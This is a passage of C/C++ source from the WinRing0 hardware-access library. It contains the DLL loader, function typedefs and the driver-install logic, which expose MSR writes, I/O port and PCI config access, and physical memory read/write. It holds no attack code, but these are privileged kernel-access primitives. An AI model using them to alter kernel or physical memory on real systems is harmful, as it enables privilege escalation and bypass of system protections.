_WriteIoPortByte WriteIoPortByte = NULL;
_WriteIoPortWord WriteIoPortWord = NULL;
_WriteIoPortDword WriteIoPortDword = NULL;

_WriteIoPortByteEx WriteIoPortByteEx = NULL;
_WriteIoPortWordEx WriteIoPortWordEx = NULL;
_WriteIoPortDwordEx WriteIoPortDwordEx = NULL;

// PCI
_SetPciMaxBusIndex SetPciMaxBusIndex = NULL;

_ReadPciConfigByte ReadPciConfigByte = NULL;
_ReadPciConfigWord ReadPciConfigWord = NULL;
_ReadPciConfigDword ReadPciConfigDword = NULL;

_ReadPciConfigByteEx ReadPciConfigByteEx = NULL;
_ReadPciConfigWordEx ReadPciConfigWordEx = NULL;
_ReadPciConfigDwordEx ReadPciConfigDwordEx = NULL;

_WritePciConfigByte WritePciConfigByte = NULL;
_WritePciConfigWord WritePciConfigWord = NULL;
_WritePciConfigDword WritePciConfigDword = NULL;

_WritePciConfigByteEx WritePciConfigByteEx = NULL;
_WritePciConfigWordEx WritePciConfigWordEx = NULL;
_WritePciConfigDwordEx WritePciConfigDwordEx = NULL;

_FindPciDeviceById FindPciDeviceById = NULL;
_FindPciDeviceByClass FindPciDeviceByClass = NULL;

// Memory
#ifdef _PHYSICAL_MEMORY_SUPPORT
_ReadDmiMemory ReadDmiMemory = NULL;
_ReadPhysicalMemory ReadPhysicalMemory = NULL;
_WritePhysicalMemory WritePhysicalMemory = NULL;
#endif

#ifdef _OPEN_LIB_SYS
#ifdef _UNICODE
#define GetOlsString GetOlsStringW
#else
#define GetOlsString GetOlsStringA
#endif

_InstallOpenLibSys InstallOpenLibSys = NULL;
_UninstallOpenLibSys UninstallOpenLibSys = NULL;
_GetDriverStatus GetDriverStatus = NULL;

_GetOlsStringA GetOlsStringA = NULL;
_GetOlsStringW GetOlsStringW = NULL;
_GetOlsValue GetOlsValue = NULL;
_SetOlsValue SetOlsValue = NULL;
#endif

//-----------------------------------------------------------------------------
//
// Initialize
//
//-----------------------------------------------------------------------------

BOOL InitOpenLibSys(HMODULE *hModule)
{
#ifdef _M_X64
	*hModule = LoadLibrary(_T("WinRing0x64.dll"));
#else
	*hModule = LoadLibrary(_T("WinRing0.dll"));
#endif

	if(*hModule == NULL)
	{
		return FALSE;
	}

	//-----------------------------------------------------------------------------
	// GetProcAddress
	//-----------------------------------------------------------------------------
	// DLL
	GetDllStatus =			(_GetDllStatus)			GetProcAddress (*hModule, "GetDllStatus");
	GetDllVersion =			(_GetDllVersion)		GetProcAddress (*hModule, "GetDllVersion");
	GetDriverVersion =		(_GetDriverVersion)		GetProcAddress (*hModule, "GetDriverVersion");
	GetDriverType =			(_GetDriverType)		GetProcAddress (*hModule, "GetDriverType");

	InitializeOls =			(_InitializeOls)		GetProcAddress (*hModule, "InitializeOls");
	DeinitializeOls =		(_DeinitializeOls)		GetProcAddress (*hModule, "DeinitializeOls");

	// CPU
	IsCpuid =				(_IsCpuid)				GetProcAddress (*hModule, "IsCpuid");
	IsMsr =					(_IsMsr)				GetProcAddress (*hModule, "IsMsr");
	IsTsc =					(_IsTsc)				GetProcAddress (*hModule, "IsTsc");
	Hlt =					(_Hlt)					GetProcAddress (*hModule, "Hlt");
	Rdmsr =					(_Rdmsr)				GetProcAddress (*hModule, "Rdmsr");
	Wrmsr =					(_Wrmsr)				GetProcAddress (*hModule, "Wrmsr");
	Rdpmc =					(_Rdpmc)				GetProcAddress (*hModule, "Rdpmc");
	Cpuid =					(_Cpuid)				GetProcAddress (*hModule, "Cpuid");
	Rdtsc =					(_Rdtsc)				GetProcAddress (*hModule, "Rdtsc");
	HltTx =					(_HltTx)				GetProcAddress (*hModule, "HltTx");
	RdmsrTx =				(_RdmsrTx)				GetProcAddress (*hModule, "RdmsrTx");
	WrmsrTx =				(_WrmsrTx)				GetProcAddress (*hModule, "WrmsrTx");
	RdpmcTx =				(_RdpmcTx)				GetProcAddress (*hModule, "RdpmcTx");
	CpuidTx =				(_CpuidTx)				GetProcAddress (*hModule, "CpuidTx");
	RdtscTx =				(_RdtscTx)				GetProcAddress (*hModule, "RdtscTx");
	HltPx =					(_HltPx)				GetProcAddress (*hModule, "HltPx");
	RdmsrPx =				(_RdmsrPx)				GetProcAddress (*hModule, "RdmsrPx");
	WrmsrPx =				(_WrmsrPx)				GetProcAddress (*hModule, "WrmsrPx");
	RdpmcPx =				(_RdpmcPx)				GetProcAddress (*hModule, "RdpmcPx");
	CpuidPx =				(_CpuidPx)				GetProcAddress (*hModule, "CpuidPx");
	RdtscPx =				(_RdtscPx)				GetProcAddress (*hModule, "RdtscPx");

	// I/O
	ReadIoPortByte =		(_ReadIoPortByte)		GetProcAddress (*hModule, "ReadIoPortByte");
	ReadIoPortWord =		(_ReadIoPortWord)		GetProcAddress (*hModule, "ReadIoPortWord");
	ReadIoPortDword =		(_ReadIoPortDword)		GetProcAddress (*hModule, "ReadIoPortDword");

	ReadIoPortByteEx =		(_ReadIoPortByteEx)		GetProcAddress (*hModule, "ReadIoPortByteEx");
	ReadIoPortWordEx =		(_ReadIoPortWordEx)		GetProcAddress (*hModule, "ReadIoPortWordEx");
	ReadIoPortDwordEx =		(_ReadIoPortDwordEx)	GetProcAddress (*hModule, "ReadIoPortDwordEx");

	WriteIoPortByte =		(_WriteIoPortByte)		GetProcAddress (*hModule, "WriteIoPortByte");
	WriteIoPortWord =		(_WriteIoPortWord)		GetProcAddress (*hModule, "WriteIoPortWord");
	WriteIoPortDword =		(_WriteIoPortDword)		GetProcAddress (*hModule, "WriteIoPortDword");

	WriteIoPortByteEx =		(_WriteIoPortByteEx)	GetProcAddress (*hModule, "WriteIoPortByteEx");
	WriteIoPortWordEx =		(_WriteIoPortWordEx)	GetProcAddress (*hModule, "WriteIoPortWordEx");
	WriteIoPortDwordEx =	(_WriteIoPortDwordEx)	GetProcAddress (*hModule, "WriteIoPortDwordEx");

	// PCI
	SetPciMaxBusIndex =		(_SetPciMaxBusIndex)	GetProcAddress (*hModule, "SetPciMaxBusIndex");

	ReadPciConfigByte =		(_ReadPciConfigByte)	GetProcAddress (*hModule, "ReadPciConfigByte");
	ReadPciConfigWord =		(_ReadPciConfigWord)	GetProcAddress (*hModule, "ReadPciConfigWord");
	ReadPciConfigDword =	(_ReadPciConfigDword)	GetProcAddress (*hModule, "ReadPciConfigDword");

	ReadPciConfigByteEx =	(_ReadPciConfigByteEx)	GetProcAddress (*hModule, "ReadPciConfigByteEx");
	ReadPciConfigWordEx =	(_ReadPciConfigWordEx)	GetProcAddress (*hModule, "ReadPciConfigWordEx");
	ReadPciConfigDwordEx =	(_ReadPciConfigDwordEx)	GetProcAddress (*hModule, "ReadPciConfigDwordEx");

	WritePciConfigByte =	(_WritePciConfigByte)	GetProcAddress (*hModule, "WritePciConfigByte");
	WritePciConfigWord =	(_WritePciConfigWord)	GetProcAddress (*hModule, "WritePciConfigWord");
	WritePciConfigDword =	(_WritePciConfigDword)	GetProcAddress (*hModule, "WritePciConfigDword");

	WritePciConfigByteEx =	(_WritePciConfigByteEx)	GetProcAddress (*hModule, "WritePciConfigByteEx");
	WritePciConfigWordEx =	(_WritePciConfigWordEx)	GetProcAddress (*hModule, "WritePciConfigWordEx");
	WritePciConfigDwordEx =	(_WritePciConfigDwordEx)GetProcAddress (*hModule, "WritePciConfigDwordEx");

	FindPciDeviceById =		(_FindPciDeviceById)	GetProcAddress (*hModule, "FindPciDeviceById");
	FindPciDeviceByClass =	(_FindPciDeviceByClass)	GetProcAddress (*hModule, "FindPciDeviceByClass");

	// Memory
#ifdef _PHYSICAL_MEMORY_SUPPORT
	ReadDmiMemory =			(_ReadDmiMemory)		GetProcAddress (*hModule, "ReadDmiMemory");
	ReadPhysicalMemory =	(_ReadPhysicalMemory)	GetProcAddress (*hModule, "ReadPhysicalMemory");
	WritePhysicalMemory =	(_WritePhysicalMemory)	GetProcAddress (*hModule, "WritePhysicalMemory");
#endif

	//-----------------------------------------------------------------------------
	// Check Functions
	//-----------------------------------------------------------------------------
	if(!(
		GetDllStatus
	&&	GetDllVersion
	&&	GetDriverVersion
	&&	GetDriverType
	&&	InitializeOls
	&&	DeinitializeOls
	&&	IsCpuid
	&&	IsMsr
	&&	IsTsc
	&&	Hlt
	&&	HltTx
	&&	HltPx
	&&	Rdmsr
	&&	RdmsrTx
	&&	RdmsrPx
	&&	Wrmsr
	&&	WrmsrTx
	&&	WrmsrPx
	&&	Rdpmc
	&&	RdpmcTx
	&&	RdpmcPx
	&&	Cpuid
	&&	CpuidTx
	&&	CpuidPx
	&&	Rdtsc
	&&	RdtscTx
	&&	RdtscPx
	&&	ReadIoPortByte
	&&	ReadIoPortWord
	&&	ReadIoPortDword
	&&	ReadIoPortByteEx
	&&	ReadIoPortWordEx
	&&	ReadIoPortDwordEx
	&&	WriteIoPortByte
	&&	WriteIoPortWord
	&&	WriteIoPortDword
	&&	WriteIoPortByteEx
	&&	WriteIoPortWordEx
	&&	WriteIoPortDwordEx
	&&	SetPciMaxBusIndex
	&&	ReadPciConfigByte
	&&	ReadPciConfigWord
	&&	ReadPciConfigDword
	&&	ReadPciConfigByteEx
	&&	ReadPciConfigWordEx
	&&	ReadPciConfigDwordEx
	&&	WritePciConfigByte
	&&	WritePciConfigWord 
	&&	WritePciConfigDword
	&&	WritePciConfigByteEx
	&&	WritePciConfigWordEx 
	&&	WritePciConfigDwordEx
	&&	FindPciDeviceById
	&&	FindPciDeviceByClass
#ifdef _PHYSICAL_MEMORY_SUPPORT
	&&	ReadDmiMemory
	&&	ReadPhysicalMemory
	&&	WritePhysicalMemory
#endif
	))
	{
		return FALSE;
	}

	return InitializeOls();
}

//-----------------------------------------------------------------------------
//
// Deinitialize
//
//-----------------------------------------------------------------------------

BOOL DeinitOpenLibSys(HMODULE *hModule)
{
	BOOL result = FALSE;

	if(*hModule == NULL)
	{
		return TRUE;
	}
	else
	{
		DeinitializeOls();
		result = FreeLibrary(*hModule);
		*hModule = NULL;

		return result;
	}
}

```

`source/WormholeDrivers/WINRING0/dll/OlsApiInitDef.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2009 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------
// for WinRing0 1.3.x

#pragma once

//-----------------------------------------------------------------------------
//
// Type Defines
//
//-----------------------------------------------------------------------------

// DLL
typedef DWORD (WINAPI *_GetDllStatus) ();
typedef DWORD (WINAPI *_GetDllVersion) (PBYTE major, PBYTE minor, PBYTE revision, PBYTE release);
typedef DWORD (WINAPI *_GetDriverVersion) (PBYTE major, PBYTE minor, PBYTE revision, PBYTE release);
typedef DWORD (WINAPI *_GetDriverType) ();

typedef BOOL (WINAPI *_InitializeOls) ();
typedef VOID (WINAPI *_DeinitializeOls) ();

// CPU
typedef BOOL (WINAPI *_IsCpuid) ();
typedef BOOL (WINAPI *_IsMsr) ();
typedef BOOL (WINAPI *_IsTsc) ();

typedef BOOL  (WINAPI *_Hlt) ();
typedef DWORD (WINAPI *_Rdmsr) (DWORD index, PDWORD eax, PDWORD edx);
typedef DWORD (WINAPI *_Wrmsr) (DWORD index, DWORD eax, DWORD edx);
typedef DWORD (WINAPI *_Rdpmc) (DWORD index, PDWORD eax, PDWORD edx);
typedef DWORD (WINAPI *_Cpuid) (DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx);
typedef DWORD (WINAPI *_Rdtsc) (PDWORD eax, PDWORD edx);

typedef BOOL  (WINAPI *_HltTx) (DWORD_PTR threadAffinityMask);
typedef DWORD (WINAPI *_RdmsrTx) (DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask);
typedef DWORD (WINAPI *_WrmsrTx) (DWORD index, DWORD eax, DWORD edx, DWORD_PTR threadAffinityMask);
typedef DWORD (WINAPI *_RdpmcTx) (DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask);
typedef DWORD (WINAPI *_CpuidTx) (DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx, DWORD_PTR threadAffinityMask);
typedef DWORD (WINAPI *_RdtscTx) (PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask);

typedef BOOL  (WINAPI *_HltPx)   (DWORD_PTR processAffinityMask);
typedef DWORD (WINAPI *_RdmsrPx) (DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask);
typedef DWORD (WINAPI *_WrmsrPx) (DWORD index, DWORD eax, DWORD edx, DWORD_PTR processAffinityMask);
typedef DWORD (WINAPI *_RdpmcPx) (DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask);
typedef DWORD (WINAPI *_CpuidPx) (DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx, DWORD_PTR processAffinityMask);
typedef DWORD (WINAPI *_RdtscPx) (PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask);

// I/O
typedef BYTE  (WINAPI *_ReadIoPortByte) (WORD address);
typedef WORD  (WINAPI *_ReadIoPortWord) (WORD address);
typedef DWORD (WINAPI *_ReadIoPortDword) (WORD address);

typedef BOOL (WINAPI *_ReadIoPortByteEx) (WORD address, PBYTE value);
typedef BOOL (WINAPI *_ReadIoPortWordEx) (WORD address, PWORD value);
typedef BOOL (WINAPI *_ReadIoPortDwordEx) (WORD address, PDWORD value);

typedef VOID (WINAPI *_WriteIoPortByte) (WORD address, BYTE value);
typedef VOID (WINAPI *_WriteIoPortWord) (WORD address, WORD value);
typedef VOID (WINAPI *_WriteIoPortDword) (WORD address, DWORD value);

typedef BOOL (WINAPI *_WriteIoPortByteEx) (WORD address, BYTE value);
typedef BOOL (WINAPI *_WriteIoPortWordEx) (WORD address, WORD value);
typedef BOOL (WINAPI *_WriteIoPortDwordEx) (WORD address, DWORD value);

// PCI
typedef VOID (WINAPI *_SetPciMaxBusIndex) (BYTE max);

typedef BYTE  (WINAPI *_ReadPciConfigByte) (DWORD pciAddress, BYTE regAddress);
typedef WORD  (WINAPI *_ReadPciConfigWord) (DWORD pciAddress, BYTE regAddress);
typedef DWORD (WINAPI *_ReadPciConfigDword) (DWORD pciAddress, BYTE regAddress);

typedef BOOL (WINAPI *_ReadPciConfigByteEx) (DWORD pciAddress, DWORD regAddress, PBYTE value);
typedef BOOL (WINAPI *_ReadPciConfigWordEx) (DWORD pciAddress, DWORD regAddress, PWORD value);
typedef BOOL (WINAPI *_ReadPciConfigDwordEx) (DWORD pciAddress, DWORD regAddress, PDWORD value);

typedef VOID (WINAPI *_WritePciConfigByte) (DWORD pciAddress, BYTE regAddress, BYTE value);
typedef VOID (WINAPI *_WritePciConfigWord) (DWORD pciAddress, BYTE regAddress, WORD value);
typedef VOID (WINAPI *_WritePciConfigDword) (DWORD pciAddress, BYTE regAddress, DWORD value);

typedef BOOL (WINAPI *_WritePciConfigByteEx) (DWORD pciAddress, DWORD regAddress, BYTE value);
typedef BOOL (WINAPI *_WritePciConfigWordEx) (DWORD pciAddress, DWORD regAddress, WORD value);
typedef BOOL (WINAPI *_WritePciConfigDwordEx) (DWORD pciAddress, DWORD regAddress, DWORD value);

typedef DWORD (WINAPI *_FindPciDeviceById) (WORD vendorId, WORD deviceId, BYTE index);
typedef DWORD (WINAPI *_FindPciDeviceByClass) (BYTE baseClass, BYTE subClass, BYTE programIf, BYTE index);

// Memory
#ifdef _PHYSICAL_MEMORY_SUPPORT
typedef DWORD (WINAPI *_ReadDmiMemory) (PBYTE buffer, DWORD count, DWORD unitSize);
typedef DWORD (WINAPI *_ReadPhysicalMemory) (DWORD_PTR address, PBYTE buffer, DWORD count, DWORD unitSize);
typedef DWORD (WINAPI *_WritePhysicalMemory) (DWORD_PTR address, PBYTE buffer, DWORD count, DWORD unitSize);
#endif

```

`source/WormholeDrivers/WINRING0/dll/OlsApiInitExt.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2009 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------
// for WinRing0 1.3.x

#pragma once

#include "OlsApiInitDef.h"

//-----------------------------------------------------------------------------
//
// Externs
//
//-----------------------------------------------------------------------------

// DLL
extern _GetDllStatus GetDllStatus;
extern _GetDllVersion GetDllVersion;
extern _GetDriverVersion GetDriverVersion;
extern _GetDriverType GetDriverType;

extern _InitializeOls InitializeOls;
extern _DeinitializeOls DeinitializeOls;

// CPU
extern _IsCpuid IsCpuid;
extern _IsMsr IsMsr;
extern _IsTsc IsTsc;

extern _Hlt Hlt;
extern _Rdmsr Rdmsr;
extern _Wrmsr Wrmsr;
extern _Rdpmc Rdpmc;
extern _Cpuid Cpuid;
extern _Rdtsc Rdtsc;

extern _HltTx HltTx;
extern _RdmsrTx RdmsrTx;
extern _WrmsrTx WrmsrTx;
extern _RdpmcTx RdpmcTx;
extern _CpuidTx CpuidTx;
extern _RdtscTx RdtscTx;

extern _HltPx HltPx;
extern _RdmsrPx RdmsrPx;
extern _WrmsrPx WrmsrPx;
extern _RdpmcPx RdpmcPx;
extern _CpuidPx CpuidPx;
extern _RdtscPx RdtscPx;

// I/O
extern _ReadIoPortByte ReadIoPortByte;
extern _ReadIoPortWord ReadIoPortWord;
extern _ReadIoPortDword ReadIoPortDword;

extern _ReadIoPortByteEx ReadIoPortByteEx;
extern _ReadIoPortWordEx ReadIoPortWordEx;
extern _ReadIoPortDwordEx ReadIoPortDwordEx;

extern _WriteIoPortByte WriteIoPortByte;
extern _WriteIoPortWord WriteIoPortWord;
extern _WriteIoPortDword WriteIoPortDword;

extern _WriteIoPortByteEx WriteIoPortByteEx;
extern _WriteIoPortWordEx WriteIoPortWordEx;
extern _WriteIoPortDwordEx WriteIoPortDwordEx;

// PCI
extern _SetPciMaxBusIndex SetPciMaxBusIndex;

extern _ReadPciConfigByte ReadPciConfigByte;
extern _ReadPciConfigWord ReadPciConfigWord;
extern _ReadPciConfigDword ReadPciConfigDword;

extern _ReadPciConfigByteEx ReadPciConfigByteEx;
extern _ReadPciConfigWordEx ReadPciConfigWordEx;
extern _ReadPciConfigDwordEx ReadPciConfigDwordEx;

extern _WritePciConfigByte WritePciConfigByte;
extern _WritePciConfigWord WritePciConfigWord;
extern _WritePciConfigDword WritePciConfigDword;

extern _WritePciConfigByteEx WritePciConfigByteEx;
extern _WritePciConfigWordEx WritePciConfigWordEx;
extern _WritePciConfigDwordEx WritePciConfigDwordEx;

extern _FindPciDeviceById FindPciDeviceById;
extern _FindPciDeviceByClass FindPciDeviceByClass;

// Memory
#ifdef _PHYSICAL_MEMORY_SUPPORT
extern _ReadDmiMemory ReadDmiMemory;
extern _ReadPhysicalMemory ReadPhysicalMemory;
extern _WritePhysicalMemory WritePhysicalMemory;
#endif

```

`source/WormholeDrivers/WINRING0/dll/OlsDef.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#pragma once

//-----------------------------------------------------------------------------
//
// DLL Status Code
//
//-----------------------------------------------------------------------------

#define OLS_DLL_NO_ERROR						0
#define OLS_DLL_UNSUPPORTED_PLATFORM			1
#define OLS_DLL_DRIVER_NOT_LOADED				2
#define OLS_DLL_DRIVER_NOT_FOUND				3
#define OLS_DLL_DRIVER_UNLOADED					4
#define OLS_DLL_DRIVER_NOT_LOADED_ON_NETWORK	5
#define OLS_DLL_UNKNOWN_ERROR					9

//-----------------------------------------------------------------------------
//
// Driver Type
//
//-----------------------------------------------------------------------------

#define OLS_DRIVER_TYPE_UNKNOWN			0
#define OLS_DRIVER_TYPE_WIN_9X			1
#define OLS_DRIVER_TYPE_WIN_NT			2
#define OLS_DRIVER_TYPE_WIN_NT4			3	// Obsolete
#define OLS_DRIVER_TYPE_WIN_NT_X64		4
#define OLS_DRIVER_TYPE_WIN_NT_IA64		5	// Reseved

//-----------------------------------------------------------------------------
//
// PCI Error Code
//
//-----------------------------------------------------------------------------

#define OLS_ERROR_PCI_BUS_NOT_EXIST		(0xE0000001L)
#define OLS_ERROR_PCI_NO_DEVICE			(0xE0000002L)
#define OLS_ERROR_PCI_WRITE_CONFIG		(0xE0000003L)
#define OLS_ERROR_PCI_READ_CONFIG		(0xE0000004L)

//-----------------------------------------------------------------------------
//
// Support Macros
//
//-----------------------------------------------------------------------------

// Bus Number, Device Number and Function Number to PCI Device Address
#define PciBusDevFunc(Bus, Dev, Func)	((Bus&0xFF)<<8) | ((Dev&0x1F)<<3) | (Func&7)
// PCI Device Address to Bus Number
#define PciGetBus(address)				((address>>8) & 0xFF)
// PCI Device Address to Device Number
#define PciGetDev(address)				((address>>3) & 0x1F)
// PCI Device Address to Function Number
#define PciGetFunc(address)				(address&7)

```

`source/WormholeDrivers/WINRING0/dll/OlsDll.cpp`:

```cpp
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include "stdafx.h"
#include <tchar.h>
#include <winioctl.h>
#include <intrin.h>

#include "OlsIoctl.h"
#include "OlsDll.h"
#include "OlsDef.h"
#include "Driver.h"

//-----------------------------------------------------------------------------
//
// Global
//
//-----------------------------------------------------------------------------

HANDLE gHandle = INVALID_HANDLE_VALUE;

BOOL gIsNT = FALSE;
BOOL gIsCpuid = FALSE;
BOOL gIsMsr = FALSE;
BOOL gIsTsc = FALSE;
BOOL gInitDll = FALSE;

TCHAR gDriverFileName[MAX_PATH];
TCHAR gDriverPath[MAX_PATH];
DWORD gDllStatus = OLS_DLL_UNKNOWN_ERROR;
DWORD gDriverType = OLS_DRIVER_TYPE_UNKNOWN;

//-----------------------------------------------------------------------------
//
// Prototypes for Support Functions
//
//-----------------------------------------------------------------------------

static BOOL IsNT();
static BOOL IsCpuid();
static BOOL IsMsr();
static BOOL IsTsc();
static BOOL IsWow64();
static BOOL IsX64();
static BOOL IsFileExist(LPCTSTR fileName);
static BOOL IsOnNetworkDrive(LPCTSTR fileName);

//-----------------------------------------------------------------------------
//
// Initialize/Deinitialize API
//
//-----------------------------------------------------------------------------

BOOL WINAPI InitializeOls()
{
	if(gInitDll == FALSE)
	{
		gIsNT = IsNT();
		gIsCpuid = IsCpuid();
		if(gIsCpuid)
		{
			gIsMsr = IsMsr();
			gIsTsc = IsTsc();
		}
		gDllStatus = InitDriverInfo();

		if(gDllStatus == OLS_DLL_NO_ERROR)
		{
			// Retry, Max 1000ms
			for(int i = 0; i < 4; i++)
			{
				gDllStatus = Initialize();
				if(gDllStatus == OLS_DLL_NO_ERROR)
				{
					break;
				}
				Sleep(100 * i);
			}
		}
		gInitDll = TRUE;
	}
	return (BOOL)(gDllStatus == OLS_DLL_NO_ERROR);
}

VOID WINAPI DeinitializeOls()
{
	if(gInitDll == TRUE)
	{
		if(gIsNT && GetRefCount() == 1)
		{
			CloseHandle(gHandle);
			gHandle = INVALID_HANDLE_VALUE;
			ManageDriver(OLS_DRIVER_ID, gDriverPath, OLS_DRIVER_REMOVE);
		}

		if(gHandle != INVALID_HANDLE_VALUE)
		{
			CloseHandle(gHandle);
			gHandle = INVALID_HANDLE_VALUE;
		}
		gInitDll = FALSE;
	}
}

//-----------------------------------------------------------------------------
//
// DllMain
//
//-----------------------------------------------------------------------------

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		DeinitializeOls();
		break;
	}
    return TRUE;
}

//-----------------------------------------------------------------------------
//
// Initialize/Deinitialize Functions
//
//-----------------------------------------------------------------------------
DWORD Initialize()
{
	TCHAR dir[MAX_PATH];
	TCHAR *ptr;

	GetModuleFileName(NULL, dir, MAX_PATH);
	if((ptr = _tcsrchr(dir, '\\')) != NULL)
	{
		*ptr = '\0';
	}
	wsprintf(gDriverPath, _T("%s\\%s"), dir, gDriverFileName);

	if(IsFileExist(gDriverPath) == FALSE)
	{
		return OLS_DLL_DRIVER_NOT_FOUND;
	}

	if(IsOnNetworkDrive(gDriverPath) == TRUE)
	{
		return OLS_DLL_DRIVER_NOT_LOADED_ON_NETWORK;
	}

	if(gIsNT)
	{
		if(OpenDriver())
		{
			return OLS_DLL_NO_ERROR;
		}

		ManageDriver(OLS_DRIVER_ID, gDriverPath, OLS_DRIVER_REMOVE);
		if(!ManageDriver(OLS_DRIVER_ID, gDriverPath, OLS_DRIVER_INSTALL))
		{
			ManageDriver(OLS_DRIVER_ID, gDriverPath, OLS_DRIVER_REMOVE);
			return OLS_DLL_DRIVER_NOT_LOADED;
		}
		
		if(OpenDriver())
		{
			return OLS_DLL_NO_ERROR;
		}
		return OLS_DLL_DRIVER_NOT_LOADED;
	}
	else
	{
		gHandle = CreateFile(
			_T("\\\\.\\") OLS_DRIVER_FILE_NAME_WIN_9X,
			0, 0, NULL,	0, 
			FILE_FLAG_DELETE_ON_CLOSE,
			NULL);

		if(gHandle == INVALID_HANDLE_VALUE)
		{
			return OLS_DLL_DRIVER_NOT_LOADED;
		}
		return OLS_DLL_NO_ERROR;
	}
}

BOOL OpenDriver()
{
	gHandle = CreateFile(
		_T("\\\\.\\") OLS_DRIVER_ID,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
        );

    if(gHandle == INVALID_HANDLE_VALUE)
	{
        return FALSE;
    }
	return TRUE;
}

DWORD GetRefCount()
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD refCount;
	DWORD length, result;

	refCount = 0;

	result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_GET_REFCOUNT,
                        NULL,
                        0,
                        &refCount,
                        sizeof(refCount),
                        &length,
                        NULL
                        );
	if(! result)
	{
		refCount = 0;
	}

	return refCount;
}

DWORD InitDriverInfo()
{
	OSVERSIONINFO osvi;
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);

	switch(osvi.dwPlatformId)
	{
	case VER_PLATFORM_WIN32s:
		gDriverType = OLS_DRIVER_TYPE_UNKNOWN;
		return OLS_DLL_UNSUPPORTED_PLATFORM;
		break;
	case VER_PLATFORM_WIN32_WINDOWS:
		_tcscpy_s(gDriverFileName, MAX_PATH, OLS_DRIVER_FILE_NAME_WIN_9X); 
		gDriverType = OLS_DRIVER_TYPE_WIN_9X;
		return OLS_DLL_NO_ERROR;
		break;
	case VER_PLATFORM_WIN32_NT:
#ifdef _WIN64
#ifdef _M_X64
		_tcscpy_s(gDriverFileName, MAX_PATH, OLS_DRIVER_FILE_NAME_WIN_NT_X64); 
		gDriverType = OLS_DRIVER_TYPE_WIN_NT_X64;
#else // IA64
		_tcscpy_s(gDriverFileName, MAX_PATH, OLS_DRIVER_FILE_NAME_WIN_NT_IA64); 
		gDriverType = OLS_DRIVER_TYPE_WIN_NT_IA64;
		return OLS_DLL_UNSUPPORTED_PLATFORM;
#endif
#else
		if(IsWow64())
		{
			if(IsX64())
			{
				_tcscpy_s(gDriverFileName, MAX_PATH, OLS_DRIVER_FILE_NAME_WIN_NT_X64);
				gDriverType = OLS_DRIVER_TYPE_WIN_NT_X64;
			}
			else
			{
				_tcscpy_s(gDriverFileName, MAX_PATH, OLS_DRIVER_FILE_NAME_WIN_NT_IA64);
				gDriverType = OLS_DRIVER_TYPE_WIN_NT_IA64;
				return OLS_DLL_UNSUPPORTED_PLATFORM;
			}
		}
		else
		{
			_tcscpy_s(gDriverFileName, MAX_PATH, OLS_DRIVER_FILE_NAME_WIN_NT);
			gDriverType = OLS_DRIVER_TYPE_WIN_NT;
		}
#endif
		return OLS_DLL_NO_ERROR;
		break;
	default:
		gDriverType = OLS_DRIVER_TYPE_UNKNOWN;
		return OLS_DLL_UNKNOWN_ERROR;
		break;
	}
}

//-----------------------------------------------------------------------------
//
// Support Functions
//
//-----------------------------------------------------------------------------

BOOL IsCpuid()
{
	__try
	{
		int info[4];
		__cpuid(info, 0x0);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL IsMsr()
{
	// MSR : Standard Feature Flag EDX, Bit 5 
	int info[4];
	__cpuid(info, 0x1);

	return ((info[3] >> 5) & 1);
}

BOOL IsTsc()
{
	// TSC : Standard Feature Flag EDX, Bit 4 
	int info[4];
	__cpuid(info, 0x1);

	return ((info[3] >> 4) & 1);
}

BOOL IsNT()
{
	OSVERSIONINFO osvi;
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);

	return (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT);
}

typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE hProcess, PBOOL Wow64Process);

BOOL IsWow64()
{
	BOOL isWow64 = FALSE;
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
									GetModuleHandle(_T("kernel32")), "IsWow64Process");

	if(fnIsWow64Process != NULL)
	{
		if(! fnIsWow64Process(GetCurrentProcess(), &isWow64))
		{
			// handle error
			isWow64 = FALSE;
		}
	}
	return isWow64;
}

